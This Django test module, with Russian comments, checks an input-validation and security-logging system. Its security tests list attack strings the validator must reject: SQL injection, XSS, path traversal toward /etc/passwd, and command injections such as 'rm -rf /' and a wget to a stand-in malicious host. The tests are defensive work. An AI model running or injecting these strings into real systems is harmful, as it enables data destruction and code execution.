# -*- coding: utf-8 -*-
"""
Тесты для системы валидации и безопасности.

Этот модуль содержит комплексные тесты для всех компонентов
системы валидации, включая валидаторы, middleware, декораторы
и систему логирования безопасности.
"""

import json
import tempfile
from unittest.mock import patch, MagicMock
from django.test import TestCase, RequestFactory
from django.http import JsonResponse
from django.core.exceptions import ValidationError
from django.contrib.auth.models import User, AnonymousUser
from django.core.files.uploadedfile import SimpleUploadedFile
from django.core.cache import cache

from .advanced_validation import AdvancedValidator, DataIntegrityValidator
from .security_logging import (
    SecurityEvent, SecurityLogger, log_security_event,
    log_suspicious_request, log_rate_limit_exceeded
)
from ..decorators.validation_decorators import (
    validate_json_input, validate_query_params, sanitize_input_data,
    validate_file_upload, require_authentication
)
from ..middleware.validation_middleware import (
    InputValidationMiddleware, RateLimitMiddleware
)


class AdvancedValidatorTestCase(TestCase):
    """Тесты для AdvancedValidator."""
    
    def setUp(self):
        self.validator = AdvancedValidator()
    
    def test_validate_string_valid(self):
        """Тест валидации корректной строки."""
        result = AdvancedValidator.validate_string("Hello World")
        self.assertEqual(result, "Hello World")
    
    def test_validate_string_with_max_length(self):
        """Тест валидации строки с ограничением длины."""
        result = AdvancedValidator.validate_string("Hello", max_length=10)
        self.assertEqual(result, "Hello")
        
        with self.assertRaises(ValidationError):
            AdvancedValidator.validate_string("Very long string", max_length=5)
    
    def test_validate_string_xss_attack(self):
        """Тест обнаружения XSS атаки."""
        with self.assertRaises(ValidationError):
            AdvancedValidator.validate_string("<script>alert('xss')</script>")
        
        with self.assertRaises(ValidationError):
            AdvancedValidator.validate_string("javascript:alert('xss')")
    
    def test_validate_string_sql_injection(self):
        """Тест обнаружения SQL инъекции."""
        with self.assertRaises(ValidationError):
            AdvancedValidator.validate_string("'; DROP TABLE users; --")
        
        with self.assertRaises(ValidationError):
            AdvancedValidator.validate_string("1' OR '1'='1")
    
    def test_validate_email_valid(self):
        """Тест валидации корректного email."""
        result = AdvancedValidator.validate_email("user@example.com")
        self.assertEqual(result, "user@example.com")
    
    def test_validate_email_invalid(self):
        """Тест валидации некорректного email."""
        with self.assertRaises(ValidationError):
            AdvancedValidator.validate_email("invalid-email")
        
        with self.assertRaises(ValidationError):
            AdvancedValidator.validate_email("user@")
        
        with self.assertRaises(ValidationError):
            AdvancedValidator.validate_email("@example.com")
    
    def test_validate_password_strong(self):
        """Тест валидации сильного пароля."""
        # Не должно вызывать исключение
        AdvancedValidator.validate_password("StrongPass123!")
    
    def test_validate_password_weak(self):
        """Тест валидации слабого пароля."""
        with self.assertRaises(ValidationError):
            AdvancedValidator.validate_password("weak")
        
        with self.assertRaises(ValidationError):
            AdvancedValidator.validate_password("password123")  # нет спецсимволов
        
        with self.assertRaises(ValidationError):
            AdvancedValidator.validate_password("PASSWORD!")  # нет цифр
    
    def test_validate_phone_valid(self):
        """Тест валидации корректного телефона."""
        result = AdvancedValidator.validate_phone("+7 (999) 123-45-67")
        self.assertIsNotNone(result)
    
    def test_validate_phone_invalid(self):
        """Тест валидации некорректного телефона."""
        with self.assertRaises(ValidationError):
            AdvancedValidator.validate_phone("123")
        
        with self.assertRaises(ValidationError):
            AdvancedValidator.validate_phone("invalid-phone")
    
    def test_validate_url_valid(self):
        """Тест валидации корректного URL."""
        result = AdvancedValidator.validate_url("https://example.com")
        self.assertEqual(result, "https://example.com")
    
    def test_validate_url_invalid(self):
        """Тест валидации некорректного URL."""
        with self.assertRaises(ValidationError):
            AdvancedValidator.validate_url("not-a-url")
        
        with self.assertRaises(ValidationError):
            AdvancedValidator.validate_url("javascript:alert('xss')")
    
    def test_sanitize_string(self):
        """Тест санитизации строки."""
        result = AdvancedValidator.sanitize_string("<script>alert('xss')</script>")
        self.assertNotIn("<script>", result)
        self.assertNotIn("</script>", result)
    
    def test_validate_json_valid(self):
        """Тест валидации корректного JSON."""
        json_str = '{"name": "John", "age": 30}'
        result = AdvancedValidator.validate_json(json_str)
        self.assertEqual(result, {"name": "John", "age": 30})
    
    def test_validate_json_invalid(self):
        """Тест валидации некорректного JSON."""
        with self.assertRaises(ValidationError):
            AdvancedValidator.validate_json("invalid json")
        
        with self.assertRaises(ValidationError):
            AdvancedValidator.validate_json('{"name": "John",}')


class DataIntegrityValidatorTestCase(TestCase):
    """Тесты для DataIntegrityValidator."""
    
    def test_calculate_checksum(self):
        """Тест вычисления контрольной суммы."""
        data = "test data"
        checksum = DataIntegrityValidator.calculate_checksum(data)
        self.assertIsInstance(checksum, str)
        self.assertEqual(len(checksum), 64)  # SHA-256 hash length
    
    def test_verify_checksum_valid(self):
        """Тест проверки корректной контрольной суммы."""
        data = "test data"
        checksum = DataIntegrityValidator.calculate_checksum(data)
        self.assertTrue(DataIntegrityValidator.verify_checksum(data, checksum))
    
    def test_verify_checksum_invalid(self):
        """Тест проверки некорректной контрольной суммы."""
        data = "test data"
        wrong_checksum = "wrong_checksum"
        self.assertFalse(DataIntegrityValidator.verify_checksum(data, wrong_checksum))


class SecurityLoggingTestCase(TestCase):
    """Тесты для системы логирования безопасности."""
    
    def setUp(self):
        self.factory = RequestFactory()
        cache.clear()
    
    def test_security_event_creation(self):
        """Тест создания события безопасности."""
        event = SecurityEvent(
            event_type='TEST_EVENT',
            severity='HIGH',
            message='Test message',
            details={'key': 'value'}
        )
        
        self.assertEqual(event.event_type, 'TEST_EVENT')
        self.assertEqual(event.severity, 'HIGH')
        self.assertEqual(event.message, 'Test message')
        self.assertEqual(event.details, {'key': 'value'})
    
    @patch('apps.core.validation.security_logging.logger')
    def test_log_security_event(self, mock_logger):
        """Тест логирования события безопасности."""
        log_security_event(
            event_type='TEST_EVENT',
            severity='HIGH',
            message='Test message'
        )
        
        mock_logger.warning.assert_called_once()
    
    @patch('apps.core.validation.security_logging.logger')
    def test_log_suspicious_request(self, mock_logger):
        """Тест логирования подозрительного запроса."""
        request = self.factory.get('/test/')
        
        log_suspicious_request(
            request=request,
            attack_type='XSS',
            details={'ip': '127.0.0.1'}
        )
        
        mock_logger.warning.assert_called_once()
    
    @patch('apps.core.validation.security_logging.logger')
    def test_log_rate_limit_exceeded(self, mock_logger):
        """Тест логирования превышения лимита запросов."""
        request = self.factory.get('/test/')
        
        log_rate_limit_exceeded(
            request=request,
            limit_type='general',
            current_count=101,
            limit=100
        )
        
        mock_logger.warning.assert_called_once()


class ValidationDecoratorsTestCase(TestCase):
    """Тесты для декораторов валидации."""
    
    def setUp(self):
        self.factory = RequestFactory()
        self.user = User.objects.create_user(
            username='testuser',
            password='testpass123'
        )
    
    def test_validate_json_input_valid(self):
        """Тест декоратора валидации JSON с корректными данными."""
        @validate_json_input(['name', 'email'])
        def test_view(request):
            return JsonResponse({'status': 'success'})
        
        request_data = {'name': 'John', 'email': 'john@example.com'}
        request = self.factory.post(
            '/test/',
            data=json.dumps(request_data),
            content_type='application/json'
        )
        
        response = test_view(request)
        self.assertEqual(response.status_code, 200)
    
    def test_validate_json_input_missing_field(self):
        """Тест декоратора валидации JSON с отсутствующим полем."""
        @validate_json_input(['name', 'email'])
        def test_view(request):
            return JsonResponse({'status': 'success'})
        
        request_data = {'name': 'John'}  # отсутствует email
        request = self.factory.post(
            '/test/',
            data=json.dumps(request_data),
            content_type='application/json'
        )
        
        response = test_view(request)
        self.assertEqual(response.status_code, 400)
    
    def test_validate_query_params_valid(self):
        """Тест декоратора валидации параметров запроса."""
        @validate_query_params(['page', 'limit'])
        def test_view(request):
            return JsonResponse({'status': 'success'})
        
        request = self.factory.get('/test/?page=1&limit=10')
        response = test_view(request)
        self.assertEqual(response.status_code, 200)
    
    def test_sanitize_input_data(self):
        """Тест декоратора санитизации данных."""
        @sanitize_input_data
        def test_view(request):
            return JsonResponse({'status': 'success'})
        
        request = self.factory.post('/test/', {'data': '<script>alert("xss")</script>'})
        response = test_view(request)
        self.assertEqual(response.status_code, 200)
    
    def test_validate_file_upload_valid(self):
        """Тест декоратора валидации файлов с корректным файлом."""
        @validate_file_upload(
            allowed_extensions=['.txt'],
            max_size=1024
        )
        def test_view(request):
            return JsonResponse({'status': 'success'})
        
        test_file = SimpleUploadedFile(
            "test.txt",
            b"file content",
            content_type="text/plain"
        )
        
        request = self.factory.post('/test/', {'file': test_file})
        response = test_view(request)
        self.assertEqual(response.status_code, 200)
    
    def test_validate_file_upload_invalid_extension(self):
        """Тест декоратора валидации файлов с некорректным расширением."""
        @validate_file_upload(
            allowed_extensions=['.txt'],
            max_size=1024
        )
        def test_view(request):
            return JsonResponse({'status': 'success'})
        
        test_file = SimpleUploadedFile(
            "test.exe",
            b"file content",
            content_type="application/octet-stream"
        )
        
        request = self.factory.post('/test/', {'file': test_file})
        response = test_view(request)
        self.assertEqual(response.status_code, 400)
    
    def test_require_authentication_authenticated(self):
        """Тест декоратора аутентификации с аутентифицированным пользователем."""
        @require_authentication()
        def test_view(request):
            return JsonResponse({'status': 'success'})
        
        request = self.factory.get('/test/')
        request.user = self.user
        
        response = test_view(request)
        self.assertEqual(response.status_code, 200)
    
    def test_require_authentication_anonymous(self):
        """Тест декоратора аутентификации с анонимным пользователем."""
        @require_authentication()
        def test_view(request):
            return JsonResponse({'status': 'success'})
        
        request = self.factory.get('/test/')
        request.user = AnonymousUser()
        
        response = test_view(request)
        self.assertEqual(response.status_code, 401)


class ValidationMiddlewareTestCase(TestCase):
    """Тесты для middleware валидации."""
    
    def setUp(self):
        self.factory = RequestFactory()
        self.middleware = InputValidationMiddleware(lambda r: JsonResponse({'status': 'ok'}))
        cache.clear()
    
    def test_input_validation_middleware_valid_request(self):
        """Тест middleware с корректным запросом."""
        request = self.factory.get('/test/')
        response = self.middleware(request)
        self.assertEqual(response.status_code, 200)
    
    def test_input_validation_middleware_xss_attack(self):
        """Тест middleware с XSS атакой."""
        request = self.factory.post('/test/', {
            'data': '<script>alert("xss")</script>'
        })
        response = self.middleware(request)
        # Middleware должен санитизировать данные, но не блокировать запрос
        self.assertEqual(response.status_code, 200)
    
    def test_rate_limit_middleware_normal_usage(self):
        """Тест rate limiting middleware при нормальном использовании."""
        rate_middleware = RateLimitMiddleware(lambda r: JsonResponse({'status': 'ok'}))
        
        request = self.factory.get('/test/')
        response = rate_middleware(request)
        self.assertEqual(response.status_code, 200)
    
    @patch('apps.core.middleware.validation_middleware.cache')
    def test_rate_limit_middleware_exceeded(self, mock_cache):
        """Тест rate limiting middleware при превышении лимита."""
        # Мокаем cache чтобы симулировать превышение лимита
        mock_cache.get.return_value = 101  # превышение лимита в 100 запросов
        
        rate_middleware = RateLimitMiddleware(lambda r: JsonResponse({'status': 'ok'}))
        
        request = self.factory.get('/test/')
        response = rate_middleware(request)
        self.assertEqual(response.status_code, 429)


class IntegrationTestCase(TestCase):
    """Интеграционные тесты для всей системы валидации."""
    
    def setUp(self):
        self.factory = RequestFactory()
        self.user = User.objects.create_user(
            username='testuser',
            password='testpass123'
        )
        cache.clear()
    
    def test_full_validation_pipeline(self):
        """Тест полного пайплайна валидации."""
        @require_authentication()
        @validate_json_input(['name', 'email'])
        @sanitize_input_data
        def test_view(request):
            data = json.loads(request.body)
            return JsonResponse({
                'status': 'success',
                'data': data
            })
        
        # Middleware
        middleware = InputValidationMiddleware(test_view)
        
        # Корректный запрос
        request_data = {
            'name': 'John Doe',
            'email': 'john@example.com'
        }
        
        request = self.factory.post(
            '/test/',
            data=json.dumps(request_data),
            content_type='application/json'
        )
        request.user = self.user
        
        response = middleware(request)
        self.assertEqual(response.status_code, 200)
        
        response_data = json.loads(response.content)
        self.assertEqual(response_data['status'], 'success')
        self.assertEqual(response_data['data']['name'], 'John Doe')
        self.assertEqual(response_data['data']['email'], 'john@example.com')
    
    def test_attack_detection_and_blocking(self):
        """Тест обнаружения и блокировки атак."""
        @validate_json_input(['data'])
        def test_view(request):
            return JsonResponse({'status': 'success'})
        
        middleware = InputValidationMiddleware(test_view)
        
        # Запрос с XSS атакой
        request_data = {
            'data': '<script>alert("xss")</script>'
        }
        
        request = self.factory.post(
            '/test/',
            data=json.dumps(request_data),
            content_type='application/json'
        )
        
        response = middleware(request)
        # Данные должны быть санитизированы, но запрос не заблокирован
        self.assertEqual(response.status_code, 200)
    
    @patch('apps.core.validation.security_logging.logger')
    def test_security_logging_integration(self, mock_logger):
        """Тест интеграции с системой логирования безопасности."""
        # Симулируем подозрительный запрос
        request = self.factory.get('/test/?q=\'; DROP TABLE users; --')
        
        log_suspicious_request(
            request=request,
            attack_type='SQL_INJECTION',
            details={'detected_pattern': 'DROP TABLE'}
        )
        
        # Проверяем, что событие было залогировано
        mock_logger.warning.assert_called_once()
        
        # Проверяем содержимое лога
        call_args = mock_logger.warning.call_args[0][0]
        self.assertIn('SQL_INJECTION', call_args)
        self.assertIn('DROP TABLE', call_args)


class PerformanceTestCase(TestCase):
    """Тесты производительности системы валидации."""
    
    def test_string_validation_performance(self):
        """Тест производительности валидации строк."""
        import time
        
        test_strings = ["valid string"] * 1000
        
        start_time = time.time()
        for test_string in test_strings:
            AdvancedValidator.validate_string(test_string)
        end_time = time.time()
        
        # Валидация 1000 строк должна занимать менее 1 секунды
        self.assertLess(end_time - start_time, 1.0)
    
    def test_json_validation_performance(self):
        """Тест производительности валидации JSON."""
        import time
        
        test_json = '{"name": "John", "age": 30, "email": "john@example.com"}'
        test_jsons = [test_json] * 100
        
        start_time = time.time()
        for json_str in test_jsons:
            AdvancedValidator.validate_json(json_str)
        end_time = time.time()
        
        # Валидация 100 JSON объектов должна занимать менее 1 секунды
        self.assertLess(end_time - start_time, 1.0)


class SecurityTestCase(TestCase):
    """Тесты безопасности системы валидации."""
    
    def test_sql_injection_patterns(self):
        """Тест обнаружения различных паттернов SQL инъекций."""
        sql_injection_patterns = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "' UNION SELECT * FROM users --",
            "1; DELETE FROM users; --",
        ]
        
        for pattern in sql_injection_patterns:
            with self.assertRaises(ValidationError, msg=f"Failed to detect SQL injection: {pattern}"):
                AdvancedValidator.validate_string(pattern)
    
    def test_xss_patterns(self):
        """Тест обнаружения различных паттернов XSS атак."""
        xss_patterns = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "<iframe src=javascript:alert('xss')></iframe>",
            "<svg onload=alert('xss')>",
        ]
        
        for pattern in xss_patterns:
            with self.assertRaises(ValidationError, msg=f"Failed to detect XSS attack: {pattern}"):
                AdvancedValidator.validate_string(pattern)
    
    def test_command_injection_patterns(self):
        """Тест обнаружения паттернов инъекции команд."""
        command_injection_patterns = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& wget malicious.com/script.sh",
            "`whoami`",
            "$(id)",
        ]
        
        for pattern in command_injection_patterns:
            with self.assertRaises(ValidationError, msg=f"Failed to detect command injection: {pattern}"):
                AdvancedValidator.validate_string(pattern)
    
    def test_path_traversal_patterns(self):
        """Тест обнаружения паттернов обхода путей."""
        path_traversal_patterns = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
        ]
        
        for pattern in path_traversal_patterns:
            with self.assertRaises(ValidationError, msg=f"Failed to detect path traversal: {pattern}"):
                AdvancedValidator.validate_string(pattern)